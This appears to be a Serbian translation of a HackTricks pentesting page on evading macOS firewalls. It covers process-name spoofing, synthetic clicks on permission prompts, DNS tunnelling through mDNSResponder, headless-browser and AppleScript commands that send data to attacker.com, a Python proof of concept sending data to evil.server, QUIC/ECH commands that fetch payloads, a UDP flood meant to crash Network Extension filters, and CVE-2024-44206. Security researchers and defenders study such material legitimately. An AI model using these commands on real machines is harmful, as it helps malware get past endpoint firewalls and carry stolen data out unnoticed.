# Zaobilaženje firewall-a na macOS-u

{{#include ../../banners/hacktricks-training.md}}

## Pronađene tehnike

Sledeće tehnike su se pokazale funkcionalnim u nekim macOS firewall aplikacijama.

### Abusing whitelist names

- Na primer, pokretanje malware-a pod imenima dobro poznatih macOS procesa, kao što je **`launchd`**

### Synthetic Click

- Ako firewall zatraži dozvolu od korisnika, naterajte malware da **klikne na allow**

### **Use Apple signed binaries**

- Kao što je **`curl`**, ali i drugi, poput **`whois`**

### Dobro poznati Apple domeni

Firewall može dozvoljavati konekcije ka dobro poznatim Apple domenima, kao što su **`apple.com`** ili **`icloud.com`**. iCloud bi mogao da se koristi kao C2.

### Generic Bypass

Neke ideje za pokušaj zaobilaženja firewall-a

### Provera dozvoljenog saobraćaja

Poznavanje dozvoljenog saobraćaja pomoći će vam da identifikujete potencijalno whitelisted domene ili aplikacije kojima je dozvoljen pristup tim domenima
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Zloupotreba DNS-a

Na macOS-u proces **ne komunicira** direktno sa DNS serverom. Razrešavanje imena se posreduje preko **XPC-a** pomoću **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), sistemskog daemon-a koji je potpisao Apple, tako da svaki lookup na mašini napušta host kao saobraćaj **od `mDNSResponder`**, umesto od procesa koji je to zahtevao. Zato firewall-i obično bezuslovno veruju tom daemon-u — njegovo blokiranje bi prekinulo razrešavanje imena za ceo sistem.<sup>[[1]](#references)</sup>

Zbog toga DNS ostaje otvoren kanal čak i kada firewall blokira sopstvene socket-e malware-a:<sup>[[1]](#references)</sup>

1. Malware pokušava da se poveže sa `evil.com`. Firewall ispituje njegovu **sopstvenu** odlaznu konekciju i **blokira je**.
2. Malware umesto toga preko XPC-a traži od `mDNSResponder` da **razreši** `evil.com`.
3. Firewall ispituje rezultujući upit, vidi da je njegov pošiljalac pouzdani resolver koji je potpisao Apple i **dozvoljava ga**.
4. Upit stiže do DNS servera — a ako napadač upravlja authoritative server-om za `evil.com`, on kontroliše oba kraja razmene.

Pošto napadač poseduje tu zonu, nikakva „konekcija“ nije potrebna: podaci se iznose unutar **zahtevanih labela** (npr. `<encoded-chunk>.evil.com`), a komande se vraćaju unutar **answer record-a** (TXT, A, CNAME…), što predstavlja klasičan DNS tunnelling koji koristi potpuno whitelisted proces.

Bilo koji unprivileged proces može direktno da upravlja daemon-om, što je jednostavan način da se potvrdi da je ovaj kanal otvoren:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Preko Browser aplikacija

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Putem ubacivanja koda u procese

Ako možete **ubaciti kod u proces** kojem je dozvoljeno povezivanje sa bilo kojim serverom, mogli biste zaobići zaštitu firewall-a:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Nedavne ranjivosti za zaobilaženje macOS firewall-a (2023–2025)

### Zaobilaženje filtera web sadržaja (Screen Time) – **CVE-2024-44206**
U julu 2024. Apple je zakrpо kritičnu grešku u Safari/WebKit-u koja je narušavala sistemski “Web content filter” koji koriste roditeljske kontrole Screen Time-a.
Posebno napravljena URI adresa (na primer, sa dvostruko URL-enkodiranim “://”) nije prepoznata od strane Screen Time ACL-a, ali je WebKit prihvata, pa se zahtev šalje bez filtriranja. Zato svaki proces koji može da otvori URL adresu (uključujući sandbox-ovan ili nepotpisan kod) može da pristupi domenima koje je korisnik ili MDM profil izričito blokirao.<sup>[[2]](#references)</sup>

Praktični test (na nezakrpljenom sistemu):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) greška u redosledu pravila u ranoj verziji macOS 14 „Sonoma“
Tokom beta ciklusa macOS-a 14, Apple je uveo regresiju u userspace wrapper-u oko **`pfctl`**.  
Pravila dodata pomoću ključne reči `quick` (koju koriste mnogi VPN kill-switch-evi) bila su nečujno ignorisana, što je uzrokovalo leak saobraćaja čak i kada je VPN/firewall GUI prikazivao *blocked*. Grešku je potvrdilo nekoliko VPN vendora, a ispravljena je u RC 2 (build 23A344).

Brza provera leak-a:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Zloupotreba pomoćnih servisa potpisanih od strane Apple-a (legacy – pre macOS 11.2)
Pre macOS 11.2, **`ContentFilterExclusionList`** je omogućavao da približno 50 Apple binarnih datoteka, kao što su **`nsurlsessiond`** i App Store, zaobiđu sve socket-filter firewall-e implementirane pomoću Network Extension framework-a (LuLu, Little Snitch itd.).
Malware je jednostavno mogao da pokrene izuzeti proces — ili da u njega ubaci kod — i tuneluje sopstveni saobraćaj preko već dozvoljenog socket-a. Apple je potpuno uklonio listu izuzetaka u macOS 11.2, ali je ova tehnika i dalje relevantna na sistemima koji ne mogu da se nadograde.<sup>[[3]](#references)</sup>

Primer proof-of-concept-a (pre 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH za zaobilaženje Network Extension domain filtera (macOS 12+)
NEFilter Packet/Data Providers se oslanjaju na TLS ClientHello SNI/ALPN. Uz **HTTP/3 preko QUIC-a (UDP/443)** i **Encrypted Client Hello (ECH)**, SNI ostaje šifrovan, NetExt ne može da parsira tok, a pravila za hostname često podrazumevano dozvoljavaju saobraćaj, što omogućava malware-u da pristupi blokiranim domenima bez korišćenja DNS-a.<sup>[[5]](#references)</sup>

Minimalni PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ako je QUIC/ECH i dalje omogućen, ovo je jednostavan način za zaobilaženje hostname filtera.

### Nestabilnost Network Extension-a u macOS-u 15 „Sequoia“ (2024–2025)
Rane verzije 15.0/15.1 obaraju filtere trećih strana zasnovane na **Network Extension-u** (LuLu, Little Snitch, Defender, SentinelOne itd.). Kada se filter ponovo pokrene, macOS odbacuje svoja flow pravila, a mnogi proizvodi prelaze u režim fail-open. Slanje poplave od hiljada kratkih UDP flow-ova (ili prisiljavanje QUIC/ECH-a) može uzastopno izazvati pad i ostaviti vremenski prozor za C2/exfil, dok GUI i dalje prikazuje da firewall radi.<sup>[[4]](#references)</sup>

Brza reprodukcija (bezbedna lab mašina):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Saveti za alate za moderni macOS

1. Pregledajte trenutna PF pravila koja generišu GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Izlistajte binarne datoteke koje već poseduju *outgoing-network* entitlement (korisno za piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programsko registrovanje sopstvenog Network Extension content filter-a u Objective-C/Swift-u.
Minimalni rootless PoC koji prosleđuje pakete lokalnom socket-u dostupan je u izvornom kodu projekta **LuLu** autora Patricka Wardlea.

## Reference

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Pravljenje i probijanje macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass omogućava neograničen pristup blokiranom sadržaju (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple uklanja macOS funkciju koja je aplikacijama omogućavala zaobilaženje Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Koristite network protection da biste sprečili macOS connections ka zlonamernim sajtovima - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
